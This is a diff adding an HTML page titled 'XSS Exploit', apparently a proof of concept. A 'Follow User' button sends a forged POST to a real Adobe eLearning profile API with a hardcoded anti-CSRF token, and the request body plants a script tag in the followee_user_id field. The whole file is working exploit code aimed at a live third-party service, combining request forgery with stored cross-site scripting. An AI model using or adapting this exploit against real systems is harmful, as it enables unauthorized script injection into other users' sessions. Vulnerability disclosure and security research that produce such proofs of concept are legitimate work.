@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Exploit</title>
+</head>
+<body>
+    <h1>Click to Follow</h1>
+    <p>Follow a user by clicking the button below</p>
+    <button id="exploitBtn">Follow User</button>
+    
+    <script>
+      document.getElementById('exploitBtn').onclick = function() {
+        const xssPayload = '{"user_id":460972,"followee_user_id":"<script>alert(document.domain)</script>","verbs":[]}';
+        
+        fetch('https://elearning.adobe.com/cpapi/v1/profile/followed', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Anti-Csrf-Header': '306c623435676767696a7269656b716d38647675646130686d76202d2028343630393732202a2034363039373229',
+            'X-Requested-With': 'XMLHttpRequest'
+          },
+          body: xssPayload
+        })
+        .then(response => response.text())
+        .then(data => console.log('Request Sent'))
+        .catch(error => console.error('Error:', error));
+      }
+    </script>
+</body>
+</html>
